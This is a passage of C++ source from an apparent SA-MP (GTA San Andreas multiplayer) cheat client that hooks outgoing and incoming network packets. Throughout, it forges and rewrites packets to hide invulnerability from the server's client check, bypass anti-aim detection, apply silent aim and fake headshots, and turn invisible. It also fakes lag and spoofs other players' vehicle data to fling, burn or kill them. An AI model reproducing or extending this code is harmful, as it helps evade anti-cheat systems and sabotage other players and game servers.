		addMessageToChatWindow("Outcoming object: playerObject %d, %d ojectId, %d response, %0.2f, %0.2f, %0.2f ,XYZ", PlayerObject == true ? 1 : 0, objectid, response, positionX, positionY, positionZ);
	}

	if (uniqueID == RPC_Chat && g_Players != nullptr)
	{
		uint8_t byteTextLen;
		char szText[256];

		parameters->Read(byteTextLen);
		parameters->Read(szText, byteTextLen);
		szText[byteTextLen] = '\0';

		if (set.chatbox_logging)
			LogChatbox(false, "%s: %s", getPlayerName(g_Players->sLocalPlayerID), szText);
	}

	// prevent invulnerability detection
	if (uniqueID == RPC_ClientCheck && cheat_state && cheat_state->_generic.hp_cheat)
	{
		uint8_t type = 0;
		parameters->Read(type);
		if (type == 2)
		{
			uint32_t arg = 0;
			uint8_t response = 0;
			parameters->Read(arg);
			parameters->Read(response);

			// remove invulnerability flags from our real flags
			uint32_t fakeFlags = arg & (0xFF00FFFF | ((~ACTOR_FLAGS_INVULNERABLE) << 16));

			// reform packet data
			parameters->SetWriteOffset(0);
			parameters->Write(type);
			parameters->Write(fakeFlags);
			parameters->Write(response);
		}
	}
	if (uniqueID == RPC_GiveTakeDamage)
	{
		if (set.smarthealthhack && !isCheatPanicEnabled())
		{
			bool bGiveOrTake;
			parameters->ResetReadPointer();
			parameters->Read(bGiveOrTake);

			if (bGiveOrTake) // take == true , give == false
			{
				int perc = random(0, 100);
				if (perc <= set.smarthhproc)
				{
					return false;
				}
			}
		}

		if (set.silentaim && !isCheatPanicEnabled() && set.silentaim_iAimID != -1)
		{
			bool bGiveOrTake;
			short int iPlayerID;
			float fAmount;
			int iWeaponID, iBodyPart;

			parameters->ResetReadPointer();
			parameters->Read(bGiveOrTake);
			parameters->Read(iPlayerID);
			parameters->Read(fAmount);
			parameters->Read(iWeaponID);
			parameters->Read(iBodyPart);

			parameters->SetWriteOffset(0);
			parameters->Write(bGiveOrTake);
			parameters->Write(iPlayerID);
			parameters->Write(fAmount);
			parameters->Write(iWeaponID);

			if (set.silentaim_letGo)
			{
				set.silentaim_letGo = false;
				return true;
			}
			else
			{
				if (set.silentaim_iAimID != -1)
				{
					return false;
				}
			}
		}
		if (set.fakeheadshot && !isCheatPanicEnabled())
		{
			bool bGiveOrTake;
			short int iPlayerID;
			float fAmount;
			int iWeaponID, iBodyPart;

			parameters->ResetReadPointer();
			parameters->Read(bGiveOrTake);
			parameters->Read(iPlayerID);
			parameters->Read(fAmount);
			parameters->Read(iWeaponID);
			parameters->Read(iBodyPart);

			parameters->SetWriteOffset(0);
			parameters->Write(bGiveOrTake);
			parameters->Write(iPlayerID);
			parameters->Write(fAmount);
			parameters->Write(iWeaponID);
			if(!bGiveOrTake) parameters->Write(9);
			else parameters->Write(iBodyPart);
		}
	}
	return true;
}

bool OnSendPacket(BitStream* parameters, PacketPriority priority, PacketReliability reliability, char orderingChannel)
{
	if (!isCheatPanicEnabled())
	{
		uint8_t packetId;
		parameters->Read(packetId);
		if (set.netPatchAssoc[packetId][OUTCOMING_PACKET] != nullptr && set.netPatchAssoc[packetId][OUTCOMING_PACKET]->enabled)
			return false;
	}
	if (set.fakesynclag && set.fakesynclag_onceperms)
	{
		static DWORD SyncTick = GetTickCount();
		if (GetTickCount() - SyncTick > (DWORD)set.fakesynclag_delay)
		{
			SyncTick = GetTickCount();
		}
		else return false;
	}

	uint8_t packetId;
	parameters->ResetReadPointer();
	parameters->Read(packetId);

	if (packetId == ID_VEHICLE_SYNC && getHereRelease != -1)
	{
		if (GetTickCount() >= getHereRelease)
		{
			getHereRelease = -1;
			addMessageToChatWindow("{FF6347}[GetHere] {FFFFFF}Operation completed.");
		}
		else
		{
			return false;
		}
	}

	if (packetId == ID_BULLET_SYNC)
	{
		if (set.nospread_trigger > 0)
		{
			if (set.nospread_go)
			{
				set.nospread_go = false;
				set.nospread_triggers = 0;
			}
			else
			{
				set.nospread_triggers++;
				if (set.nospread_triggers >= set.nospread_trigger)
				{
					set.nospread_go = true;
				}
			}
		}
		bool bEditBulletSync = false;
		stBulletData BulletData;
		parameters->Read((PCHAR)& BulletData, sizeof(stBulletData));
		if (set.silentaim && !isCheatPanicEnabled())
		{
			if (BulletData.byteType == 1)
			{
				set.silentaim_letGo = true;
				return true;
			}

			if (set.silentaim_iAimID == -1)
				return true;

			if (!IsPlayerStreamed(set.silentaim_iAimID))
				return true;

			BulletData.byteType = 1;
			vect3_copy(&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12],
				BulletData.fOrigin);

			vect3_copy(&g_Players->pRemotePlayer[set.silentaim_iAimID]->pPlayerData->pSAMP_Actor->pGTA_Ped->base.matrix[12],
				BulletData.fTarget);

			BulletData.fCenter[0] = 0;
			BulletData.fCenter[1] = 0;
			if (g_Players->pRemotePlayer[set.silentaim_iAimID]->pPlayerData->bytePlayerState == PLAYER_STATE_ONFOOT)
			{
				BulletData.fCenter[2] = 0;
			}
			else
			{
				BulletData.fCenter[2] = 0.56 - ((rand() % 5) / 100.0f);
			}
			BulletData.sTargetID = set.silentaim_iAimID;
			bool go = true;
			if (set.silentaim_antiAimBypass)
			{	
				uint8_t wepid = g_Players->pLocalPlayer->byteCurrentWeapon;
				if (wepid >= 22 && wepid <= 25)
				{
					int random_ac_bypass = srandom(0, 3);
					if (random_ac_bypass == 0) go = false;
				}

				if (wepid >= 26 && wepid <= 27)
				{
					int random_ac_bypass = srandom(0, 5);
					if (random_ac_bypass > 2) go = false;
				}

				if (wepid >= 28 && wepid <= 32)
				{
					int random_ac_bypass = srandom(0, 10);
					if (random_ac_bypass > 3) go = false;
				}

				if (wepid >= 33 && wepid <= 34)
				{
					int random_ac_bypass = srandom(0, 5);
					if (random_ac_bypass > 2) go = false;
				}
			}
			if (go)
			{
				if (g_Players->pRemotePlayer[set.silentaim_iAimID]->pPlayerData->pSAMP_Actor->pGTA_Ped->hitpoints != 0)
				{
					BitStream bsGiveDamage;
					bsGiveDamage.Write(false);
					bsGiveDamage.Write((USHORT)set.silentaim_iAimID);
					bsGiveDamage.Write(fWeaponDamage[g_Players->pLocalPlayer->byteCurrentWeapon]);
					bsGiveDamage.Write((int)g_Players->pLocalPlayer->byteCurrentWeapon);
					//Log("Custom Send: damage %f, player %d, weapon %d", fWeaponDamage[g_Players->pLocalPlayer->byteCurrentWeapon], g_NewModSa->iAimPlayerID, g_Players->pLocalPlayer->byteCurrentWeapon);
					if (set.fakeheadshot)
					{
						bsGiveDamage.Write(9);
					}
					else
					{
						bsGiveDamage.Write((UINT32)srandom<UINT32>(3, 9));
					}

					g_RakClient->RPC(RPC_GiveTakeDamage, &bsGiveDamage, HIGH_PRIORITY, RELIABLE_SEQUENCED, NULL, false);
				}
			}
			else
			{
				BulletData.byteType = 0;
			}
			bEditBulletSync = true;
		}
		if (bEditBulletSync)
		{
			parameters->Reset();
			parameters->Write((BYTE)ID_BULLET_SYNC);
			parameters->Write((PCHAR)& BulletData, sizeof(stBulletData));
			g_RakClient->Send(parameters, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
			return false;
		}
	}
	if (set.dShotStatus && !isCheatPanicEnabled())
	{
		uint8_t packetId;
		parameters->ResetReadPointer();
		parameters->Read(packetId);
		if (packetId == ID_BULLET_SYNC)
		{
			parameters->Read((PCHAR)& dShotBulletData, sizeof(stBulletData));
			if (set.dShotReady == 0)
			{
				set.dShotLTick = GetTickCount();
				set.dShotReady = 1;
			}
		}
	}
	if (fuckupWorking != -1)
	{
		if (packetId == ID_PLAYER_SYNC || packetId == ID_SPECTATOR_SYNC)
		{
			return false;
		}
		if(GetTickCount() >= fuckupWorking)
		{
			addMessageToChatWindow("Fucked up target.");
			SendFakeDriverFullSyncData(&fuckupLdata, 0);

			fuckupWorking = -1;
		}
	}
	if (lsrpStealGuns_Working == true)
	{
		if (packetId == ID_PLAYER_SYNC || packetId == ID_VEHICLE_SYNC || packetId == ID_SPECTATOR_SYNC)
		{
			return false;
		}
	}
	if (iTrollWorking != -1)
	{
		if (packetId == ID_PLAYER_SYNC || packetId == ID_SPECTATOR_SYNC)
		{
			return false;
		}
		if (GetTickCount() >= iTrollWorking)
		{
			addMessageToChatWindow("iTrolled target.");
			SendFakeDriverFullSyncData(&iTrollData, 0);

			iTrollWorking = -1;
			iTrollMode = -1;
		}
	}
	if (set.slapkill && !set.noBigHacks && !isCheatPanicEnabled())
	{
		cheat_handle_slapkill(parameters);
	}

	if (set.moonwalk)
	{
		uint8_t packetId;
		parameters->ResetReadPointer();
		parameters->Read(packetId);
		if (packetId == ID_PLAYER_SYNC)
		{
			stOnFootData OutgoingOnFootData;
			memset(&OutgoingOnFootData, 0, sizeof(stOnFootData));

			parameters->Read((PCHAR)&OutgoingOnFootData, sizeof(stOnFootData));

			double angle = 2.0 * acos(OutgoingOnFootData.fQuaternion[3]); // ANGLE = ANGLE IN RADIAN FROM FQUATERNION[3] // E.G. 1.5 float

			double invertedrad = angle - M_PI; // INVERT THE LAST ANGLE IN RAD
			double invertedquat3 = cos(invertedrad / 2.0); // CONVERTED TO QUATERNION LIKE HOW WE GOT ANGLE RADIAN FROM QUAT[3] IN FIRST LINE

			OutgoingOnFootData.fQuaternion[3] = invertedquat3; // FINALLY SET IT

			parameters->ResetWritePointer();
			parameters->Write(packetId);
			parameters->Write((PCHAR)&OutgoingOnFootData, sizeof(stOnFootData));		
		}
		if (packetId == ID_VEHICLE_SYNC)
		{
			stInCarData OutgoingCarData;
			memset(&OutgoingCarData, 0, sizeof(stInCarData));

			parameters->Read((PCHAR)&OutgoingCarData, sizeof(stInCarData));

			double angle = 2.0 * acos(OutgoingCarData.fQuaternion[3]); // ANGLE = ANGLE IN RADIAN FROM FQUATERNION[3] // E.G. 1.5 float

			double invertedrad = angle - M_PI; // INVERT THE LAST ANGLE IN RAD
			double invertedquat3 = cos(invertedrad / 2.0); // CONVERTED TO QUATERNION LIKE HOW WE GOT ANGLE RADIAN FROM QUAT[3] IN FIRST LINE

			OutgoingCarData.fQuaternion[3] = invertedquat3; // FINALLY SET IT

			parameters->ResetWritePointer();
			parameters->Write(packetId);
			parameters->Write((PCHAR)&OutgoingCarData, sizeof(stInCarData));
		}
	}
	if (set.upside_down)
	{
		uint8_t packetId;
		parameters->ResetReadPointer();
		parameters->Read(packetId);
		if (packetId == ID_PLAYER_SYNC)
		{
			stOnFootData OutgoingOnFootData;
			memset(&OutgoingOnFootData, 0, sizeof(stOnFootData));

			parameters->Read((PCHAR)&OutgoingOnFootData, sizeof(stOnFootData));
		
			OutgoingOnFootData.fQuaternion[0] = 0;
			OutgoingOnFootData.fQuaternion[1] = 1;
			OutgoingOnFootData.fQuaternion[2] = 0;
			OutgoingOnFootData.fQuaternion[3] = 0;

			parameters->ResetWritePointer();
			parameters->Write(packetId);
			parameters->Write((PCHAR)&OutgoingOnFootData, sizeof(stOnFootData));
		}
		if (packetId == ID_VEHICLE_SYNC)
		{
			stInCarData OutgoingCarData;
			memset(&OutgoingCarData, 0, sizeof(stInCarData));

			parameters->Read((PCHAR)&OutgoingCarData, sizeof(stInCarData));

			OutgoingCarData.fQuaternion[0] = 0;
			OutgoingCarData.fQuaternion[1] = 1;
			OutgoingCarData.fQuaternion[2] = 0;
			OutgoingCarData.fQuaternion[3] = 0;

			parameters->ResetWritePointer();
			parameters->Write(packetId);
			parameters->Write((PCHAR)&OutgoingCarData, sizeof(stInCarData));
		}
	}
	if (set.twistmode)
	{
		uint8_t packetId;
		parameters->ResetReadPointer();
		parameters->Read(packetId);
		if (packetId == ID_PLAYER_SYNC)
		{
			stOnFootData OutgoingOnFootData;
			memset(&OutgoingOnFootData, 0, sizeof(stOnFootData));

			parameters->Read((PCHAR)&OutgoingOnFootData, sizeof(stOnFootData));

			static float fRotation = 0.0f;

			OutgoingOnFootData.fQuaternion[0] = cosf(fRotation);
			OutgoingOnFootData.fQuaternion[3] = sinf(fRotation);

			OutgoingOnFootData.byteCurrentWeapon = 46;

			static DWORD timer = 0;
			if (GetTickCount() - timer > 95)
			{
				fRotation += 1.0f;
				if (fRotation >= 360.0f) fRotation = 0.0f;

				timer = GetTickCount();
			}

			static DWORD timer2 = 0;
			if (GetTickCount() - timer2 > 250)
			{
				OutgoingOnFootData.sUpDownKeys = 128;
				OutgoingOnFootData.sCurrentAnimationID = 0x3C5;
				OutgoingOnFootData.sAnimFlags = 0x1901;

				timer2 = GetTickCount();
			}

			parameters->ResetWritePointer();
			parameters->Write(packetId);
			parameters->Write((PCHAR)&OutgoingOnFootData, sizeof(stOnFootData));
		}
		if (packetId == ID_VEHICLE_SYNC)
		{
			stInCarData OutgoingCarData;
			memset(&OutgoingCarData, 0, sizeof(stInCarData));

			parameters->Read((PCHAR)&OutgoingCarData, sizeof(stInCarData));

			static float fRotation = 0.0f;

			OutgoingCarData.fQuaternion[0] = cosf(fRotation);
			OutgoingCarData.fQuaternion[3] = sinf(fRotation);

			OutgoingCarData.byteCurrentWeapon = 46;

			static DWORD timer = 0;
			if (GetTickCount() - timer > 95)
			{
				fRotation += 1.0f;
				if (fRotation >= 360.0f) fRotation = 0.0f;

				timer = GetTickCount();
			}

			static DWORD timer2 = 0;
			if (GetTickCount() - timer2 > 250)
			{
				OutgoingCarData.sUpDownKeys = 128;

				timer2 = GetTickCount();
			}

			parameters->ResetWritePointer();
			parameters->Write(packetId);
			parameters->Write((PCHAR)&OutgoingCarData, sizeof(stInCarData));
		}
	}
	if (set.ghostmode)
	{
		uint8_t packetId;
		parameters->ResetReadPointer();
		parameters->Read(packetId);
		if (packetId == ID_PLAYER_SYNC)
		{
			stOnFootData OutgoingOnFootData;
			memset(&OutgoingOnFootData, 0, sizeof(stOnFootData));

			parameters->Read((PCHAR)&OutgoingOnFootData, sizeof(stOnFootData));

			OutgoingOnFootData.byteSpecialAction = 3;

			parameters->ResetWritePointer();
			parameters->Write(packetId);
			parameters->Write((PCHAR)&OutgoingOnFootData, sizeof(stOnFootData));
		}
	}


	if (set.nearslapper == 1 && !set.noBigHacks && !isCheatPanicEnabled())
	{
		uint8_t packetId;
		parameters->ResetReadPointer();
		parameters->Read(packetId);
		if (packetId == ID_PLAYER_SYNC)
		{
			stOnFootData OutgoingOnFootData;
			memset(&OutgoingOnFootData, 0, sizeof(stOnFootData));

			parameters->Read((PCHAR)& OutgoingOnFootData, sizeof(stOnFootData));
			int iPlayerID = sampFindNearestPlayer(set.nearslapper_friendFilter, true);

			if (ValidPlayer(iPlayerID))
			{
				struct actor_info* self = actor_info_get(ACTOR_SELF, 0);
				struct actor_info* ainfo = getGTAPedFromSAMPPlayerID(iPlayerID);

				float fSelfPos[3], fTargetPos[3];

				vect3_copy(&self->base.matrix[4 * 3], fSelfPos);

				if (getPlayerPos(iPlayerID, fTargetPos) && ainfo != NULL && ainfo != self)
				{
					
					// Sync - hit the player from 4 angles (0, 90, 180, 270)

					slapperLastUpdate = GetTickCount();
					vect3_copy(fTargetPos, slapperPos);

					WORD wHitAngle = 0;
					static DWORD wHitAngleDelay = 0;

					if (set.byteSlapperState == 0)
						wHitAngle = 0;

					else if (set.byteSlapperState == 1)
						wHitAngle = 90;

					else if (set.byteSlapperState == 2)
						wHitAngle = 180;

					else if (set.byteSlapperState == 3)
						wHitAngle = 270;

					if (GetTickCount() - wHitAngleDelay > 250)
					{
						if (set.byteSlapperState < 3)
							set.byteSlapperState++;
						else
							set.byteSlapperState = 0;

						wHitAngleDelay = GetTickCount();
					}

					vect3_copy(fTargetPos, OutgoingOnFootData.fPosition);

					float fHitAngleInRadian = wHitAngle * 0.0174532925;

					if (getPlayerState(iPlayerID) == PLAYER_STATE_DRIVER || getPlayerState(iPlayerID) == PLAYER_STATE_PASSENGER)
					{
						OutgoingOnFootData.sCurrentAnimationID = 301;

						OutgoingOnFootData.fPosition[0] += sinf(-fHitAngleInRadian) * 15;
						OutgoingOnFootData.fPosition[1] += sinf(-fHitAngleInRadian) * 15;
					}
					else
					{
						OutgoingOnFootData.sCurrentAnimationID = random(0, 1000);

						OutgoingOnFootData.fQuaternion[0] = random_float(0, 2);
						OutgoingOnFootData.fQuaternion[1] = random_float(0, 2);
						OutgoingOnFootData.fQuaternion[2] = random_float(0, 2);
						OutgoingOnFootData.fQuaternion[3] = random_float(0, 2);

						OutgoingOnFootData.fPosition[0] += sinf(-fHitAngleInRadian) * 5;
						OutgoingOnFootData.fPosition[1] += sinf(-fHitAngleInRadian) * 5;
					}

					OutgoingOnFootData.fMoveSpeed[0] = sinf(fHitAngleInRadian) * 10;
					OutgoingOnFootData.fMoveSpeed[1] = cosf(fHitAngleInRadian) * 10;

					parameters->ResetWritePointer();
					parameters->Write(packetId);
					parameters->Write((PCHAR)& OutgoingOnFootData, sizeof(stOnFootData));
				}
			}
		}
	}
	if (set.iTroll >= 1 && KEY_DOWN(0x49) && !set.noBigHacks && !isCheatPanicEnabled()) // I Key
	{
		uint8_t packetId;
		parameters->ResetReadPointer();
		parameters->Read(packetId);
		int iTargetPlayerID = set.iTroll_Target;
		if (ValidPlayer(iTargetPlayerID))
		{
			if (getPlayerState(iTargetPlayerID) == PLAYER_STATE_DRIVER || getPlayerState(iTargetPlayerID) == PLAYER_STATE_PASSENGER)
			{
				uint16_t sTargetVehicleID = g_Players->pRemotePlayer[iTargetPlayerID]->pPlayerData->inCarData.sVehicleID;
				if (cheat_state->state != CHEAT_STATE_VEHICLE)
				{
					char params[32] = { 0 };
					sprintf(params, "%d %d", iTargetPlayerID, set.iTroll);
					cmd_itroll(params);
				}
				else
				{
					stInCarData data;
					memset(&data, 0, sizeof(stInCarData));
					byte packet;

					parameters->ResetReadPointer();
					parameters->Read(packet);
					parameters->Read((PCHAR)& data, sizeof(stInCarData));

					if (ValidVehicle(sTargetVehicleID))
					{
						data.sVehicleID = sTargetVehicleID;
						data.fVehicleHealth = g_Players->pRemotePlayer[iTargetPlayerID]->pPlayerData->inCarData.fVehicleHealth;
						vect4_copy(g_Players->pRemotePlayer[iTargetPlayerID]->pPlayerData->inCarData.fQuaternion, data.fQuaternion);
						vect3_copy(g_Players->pRemotePlayer[iTargetPlayerID]->pPlayerData->inCarData.fPosition, data.fPosition);
						vect3_copy(g_Players->pRemotePlayer[iTargetPlayerID]->pPlayerData->inCarData.fMoveSpeed, data.fMoveSpeed);

						switch (set.iTroll)
						{
						case 1: // mode: stuck in the ground
						{
							struct actor_info* ainfo = getGTAPedFromSAMPPlayerID(iTargetPlayerID);

							if (ainfo != NULL)
							{
								CPed* pPed = pGameInterface->GetPools()->GetPed((DWORD*)ainfo);
								float fGroundZHeight = pGame->GetWorld()->FindGroundZFor3DPosition(pPed->GetPosition());

								data.fPosition[2] = fGroundZHeight - 0.25f;

								data.fQuaternion[0] = 0.707107;
								data.fQuaternion[1] = -0.707107;
								data.fQuaternion[2] = 0;
								data.fQuaternion[3] = 0;
							}
							break;
						}
						case 2: // mode: speed up
						{
							struct actor_info* ainfo = getGTAPedFromSAMPPlayerID(iTargetPlayerID);

							if (ainfo != NULL)
							{
								data.fMoveSpeed[0] = sinf(-ainfo->fCurrentRotation) * 3.5;
								data.fMoveSpeed[1] = cosf(-ainfo->fCurrentRotation) * 3.5;
							}
							break;
						}
						case 3: // mode: burn up and throw down
						{
							float* coords = (cheat_state->state == CHEAT_STATE_VEHICLE) ? cheat_state->vehicle.coords : cheat_state->actor.coords;
							data.fVehicleHealth = 0.0f;
							data.fPosition[0] = coords[0] + random_float(20, 25);
							data.fPosition[1] = coords[1] + random_float(20, 25);
							data.fPosition[2] = coords[2] + random_float(10, 15);
							data.fMoveSpeed[2] = -(random_float(4, 10));
							break;
						}
						case 4: // mode: burn up and throw up
						{
							data.fVehicleHealth = 0.0f;
							data.fMoveSpeed[0] = random_float(0, 2);
							data.fMoveSpeed[1] = random_float(0, 2);
							data.fMoveSpeed[2] = random_float(4, 10);
							break;
						}
						case 5: // mode: spin
						{
							struct vehicle_info* vinfo = getGTAVehicleFromSAMPVehicleID(sTargetVehicleID);
							if (vinfo != NULL)
							{
								tVector right, up, at;
								float fRight[3], fUp[3];
								vect3_copy(&vinfo->base.matrix[4 * 0], fRight);
								vect3_copy(&vinfo->base.matrix[4 * 1], fUp);
								vect3_invert(fRight, fRight);
								vect3_invert(fUp, fUp);
								right.X = fRight[0];
								right.Y = fRight[1];
								right.Z = fRight[2];
								up.X = fUp[0];
								up.Y = fUp[1];
								up.Z = fUp[2];
								at.X = vinfo->base.matrixStruct->at.X;
								at.Y = vinfo->base.matrixStruct->at.Y;
								at.Z = vinfo->base.matrixStruct->at.Z;
								MatrixToQuaternion(&right, &up, &at, data.fQuaternion[0], data.fQuaternion[1], data.fQuaternion[2], data.fQuaternion[3]);
								vect3_invert(data.fMoveSpeed, data.fMoveSpeed);
							}
							break;
						}
						case 6: // mode: send to ocean
						{
							struct vehicle_info* vinfo = getGTAVehicleFromSAMPVehicleID(sTargetVehicleID);
							if (vinfo != NULL)
							{
								data.fPosition[0] = 1088.58;
								data.fPosition[1] = -2852.38;
								data.fPosition[2] = -7.00;
							}
							break;
						}
						case 7: // mode: light speed up
						{
							struct actor_info* ainfo = getGTAPedFromSAMPPlayerID(iTargetPlayerID);

							if (ainfo != NULL)
							{
								data.fMoveSpeed[0] = sinf(-ainfo->fCurrentRotation) * 1.75;
								data.fMoveSpeed[1] = cosf(-ainfo->fCurrentRotation) * 1.75;
							}
							break;
						}
						}
						parameters->ResetWritePointer();
						parameters->Write(packet);
						parameters->Write((PCHAR)& data, sizeof(stInCarData));
						g_RakClient->Send(parameters, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0);
						return false;
					}
				}
			}
		}
	}
	if (set.shotrepeater >= 1 && !isCheatPanicEnabled())
	{
		uint8_t packetId;
		parameters->ResetReadPointer();
		parameters->Read(packetId);
		if (packetId == ID_BULLET_SYNC)
		{
			for (int times = 0; times < set.shotrepeater; times++)
			{
				g_RakClient->Send(parameters, priority, reliability, orderingChannel);
			}
		}
	}
	if (set.smartinvis == 1 && !isCheatPanicEnabled())
	{
		uint8_t packetId;
		parameters->ResetReadPointer();
		parameters->Read(packetId);
		if (packetId == ID_PLAYER_SYNC)
		{

			if(KEY_DOWN(VK_LBUTTON) || KEY_DOWN(VK_RBUTTON))
			{
				cheat_state_text("Smart Invisibility NOT ACTIVE");
			}
			else
			{
				stOnFootData data;
				memset(&data, 0, sizeof(stOnFootData));
				byte packet;

				parameters->ResetReadPointer();
				parameters->Read(packet);
				parameters->Read((PCHAR)& data, sizeof(stOnFootData));

				stSpectatorData specData;
				memset(&specData, 0, sizeof(stSpectatorData));
				if (g_SAMP->pPools->pPlayer->pLocalPlayer->iIsActorAlive)
				{
					vect3_copy(g_SAMP->pPools->pPlayer->pLocalPlayer->onFootData.fPosition, specData.fPosition);
					cheat_state_text("Smart Invisibility ACTIVE");
				}
				parameters->ResetWritePointer();
				parameters->Write(ID_SPECTATOR_SYNC);
				parameters->Write((PCHAR)& specData, sizeof(stSpectatorData));
			}
		}
		if (packetId == ID_VEHICLE_SYNC)
		{
			if (KEY_DOWN(VK_LBUTTON) || KEY_DOWN(VK_RBUTTON))
			{
				cheat_state_text("Smart Invisibility NOT ACTIVE");
			}
			else
			{
				stInCarData data;
				memset(&data, 0, sizeof(stInCarData));
				byte packet;

				parameters->ResetReadPointer();
				parameters->Read(packet);
				parameters->Read((PCHAR)& data, sizeof(stInCarData));

				stSpectatorData specData;
				memset(&specData, 0, sizeof(stSpectatorData));
				if (g_SAMP->pPools->pPlayer->pLocalPlayer->iIsActorAlive)
				{
					vect3_copy(g_SAMP->pPools->pPlayer->pLocalPlayer->onFootData.fPosition, specData.fPosition);
					cheat_state_text("Smart Invisibility ACTIVE");
				}
				parameters->ResetWritePointer();
				parameters->Write(ID_SPECTATOR_SYNC);
				parameters->Write((PCHAR)& specData, sizeof(stSpectatorData));
				
				stUnoccupiedData unoccupiedData;
				memset(&unoccupiedData, 0, sizeof(stUnoccupiedData));

				data.fPosition[0] = unoccupiedData.fPosition[0];
				data.fPosition[1] = unoccupiedData.fPosition[1];
				data.fPosition[2] = unoccupiedData.fPosition[2];
				unoccupiedData.fDirection[0] = 0.0;
				unoccupiedData.fDirection[1] = 0.0;
				unoccupiedData.fDirection[2] = 0.0;
				unoccupiedData.byteSeatID = 0;
				unoccupiedData.fHealth = data.fVehicleHealth;
				vect3_copy(data.fMoveSpeed, unoccupiedData.fMoveSpeed);
				unoccupiedData.fTurnSpeed[0] = 0.0;
				unoccupiedData.fTurnSpeed[1] = 0.0;
				unoccupiedData.fTurnSpeed[2] = 0.0;
				unoccupiedData.sVehicleID = data.sVehicleID;
				BitStream *newSnd = parameters;
				newSnd->ResetWritePointer();
				newSnd->Write(ID_UNOCCUPIED_SYNC);
				newSnd->Write((PCHAR)& unoccupiedData, sizeof(stUnoccupiedData));
				g_RakClient->Send(newSnd, LOW_PRIORITY, reliability, orderingChannel);
			}
		}
	}
	if (set.inviszdown == 1 && !isCheatPanicEnabled())
	{
		uint8_t packetId;
		parameters->ResetReadPointer();
		parameters->Read(packetId);
		if (packetId == ID_PLAYER_SYNC)
		{
			stOnFootData data;
			memset(&data, 0, sizeof(stOnFootData));
			byte packet;

			parameters->ResetReadPointer();
			parameters->Read(packet);
			parameters->Read((PCHAR)& data, sizeof(stOnFootData));
			parameters->ResetReadPointer();

			data.fPosition[2] -= 15.0f;

			parameters->ResetWritePointer();
			parameters->Write(packet);
			parameters->Write((PCHAR)& data, sizeof(stOnFootData));
			cheat_state_text("Invisibility  is ACTIVE");
		}
		if (packetId == ID_VEHICLE_SYNC)
		{
			stInCarData data;
			memset(&data, 0, sizeof(stInCarData));
			byte packet;

			parameters->ResetReadPointer();
			parameters->Read(packet);
			parameters->Read((PCHAR)& data, sizeof(stInCarData));
			parameters->ResetReadPointer();

			data.fPosition[2] -= 20.0f;

			parameters->ResetWritePointer();
			parameters->Write(packet);
			parameters->Write((PCHAR)& data, sizeof(stInCarData));
			cheat_state_text("Invisibility  is ACTIVE");
		}
	}
	if (set.aimslapper == 1 && !set.noBigHacks && !isCheatPanicEnabled())
	{
		uint8_t packetId;
		parameters->ResetReadPointer();
		parameters->Read(packetId);
		if (packetId == ID_PLAYER_SYNC)
		{
			stOnFootData data; 
			memset(&data, 0, sizeof(stOnFootData));
			byte packet;

			parameters->ResetReadPointer();  
			parameters->Read(packet); 
			parameters->Read((PCHAR)& data, sizeof(stOnFootData));  
			parameters->ResetReadPointer(); 

			float camRot = *(float*)0xB6F178;
			
			data.fMoveSpeed[0] = sin(camRot) * set.aimslapperspeed;
			data.fMoveSpeed[1] = cos(camRot) * set.aimslapperspeed;
			data.fPosition[2] += 1.13f;

			parameters->ResetWritePointer();
			parameters->Write(packet);
			parameters->Write((PCHAR)& data, sizeof(stOnFootData)); 
		}		
		if (packetId == ID_VEHICLE_SYNC)
		{
			stInCarData data;
			memset(&data, 0, sizeof(stInCarData));
			byte packet;

			parameters->ResetReadPointer();
			parameters->Read(packet);
			parameters->Read((PCHAR)& data, sizeof(stInCarData));
			parameters->ResetReadPointer();

			float camRot = *(float*)0xB6F178;

			data.fMoveSpeed[0] = sin(camRot) * set.aimslapperspeed;
			data.fMoveSpeed[1] = cos(camRot) * set.aimslapperspeed;
			data.fPosition[2] += 1.13f;

			parameters->ResetWritePointer();
			parameters->Write(packet);
			parameters->Write((PCHAR)& data, sizeof(stInCarData));
		}
	}


	if (set.fakesynclag == 1 && !isCheatPanicEnabled())
	{
		parameters->ResetReadPointer();
		parameters->Read(packetId);

		if (packetId == ID_PLAYER_SYNC)
		{
			LagQueueData q;

			memset(&q.onfoot, 0, sizeof(stOnFootData));

			parameters->Read((PCHAR)&q.onfoot, sizeof(stOnFootData));

			q.executeTick = GetTickCount() +
				(set.fakesynclag_randomspikes == 1 ? random(0, set.fakesynclag_delay) : set.fakesynclag_delay);


			q.type = LAGQUEUETYPE::ONFOOTDATA;

			if (pPedSelf != NULL)
			{
				pPedSelf->GetMatrix(&q.matrix);

				q.position.fX = pPedSelf->GetPosition()->fX;
				q.position.fY = pPedSelf->GetPosition()->fY;
				q.position.fZ = pPedSelf->GetPosition()->fZ;

				pPedSelf->GetMoveSpeed(&q.movespeed);
				
				if (!LagQueuePrc.enqueue(q)) addMessageToChatWindow("Failed to use fakelag, enqueue failed.");

				return false;
			}
			cheat_state_text("ERROR! Fake lag had invalid ped handle.");

		}
		else if (packetId == ID_VEHICLE_SYNC)
		{
			LagQueueData q;

			memset(&q.incar, 0, sizeof(stInCarData));

			parameters->Read((PCHAR)&q.incar, sizeof(stInCarData));


			q.executeTick = GetTickCount() +
				(set.fakesynclag_randomspikes == 1 ? random(0, set.fakesynclag_delay) : set.fakesynclag_delay);

			q.type = LAGQUEUETYPE::CARDATA;

			if (pPedSelf != NULL && pPedSelf->GetVehicle() != NULL)
			{
				pPedSelf->GetVehicle()->GetMatrix(&q.matrix);

				q.position.fX = pPedSelf->GetVehicle()->GetPosition()->fX;
				q.position.fY = pPedSelf->GetVehicle()->GetPosition()->fY;
				q.position.fZ = pPedSelf->GetVehicle()->GetPosition()->fZ;

				pPedSelf->GetVehicle()->GetMoveSpeed(&q.movespeed);

				if (!LagQueuePrc.enqueue(q)) addMessageToChatWindow("Failed to use fakelag, enqueue failed.");

				return false;
			}
			cheat_state_text("ERROR! Fake lag had invalid ped/veh handle.");
		}
	}

	return true;
}

bool OnReceivePacket(Packet *p)
{
	if (p->data == nullptr || p->length == 0)
		return true;

	if (!isCheatPanicEnabled())
	{
		if (set.netPatchAssoc[p->data[0]][INCOMING_PACKET] != nullptr && set.netPatchAssoc[p->data[0]][INCOMING_PACKET]->enabled)
			return false;
	}

	if (p->data[0] == ID_MARKERS_SYNC) // packetId
	{
		BitStream	bs(p->data, p->length, false);
		int			iNumberOfPlayers = 0;
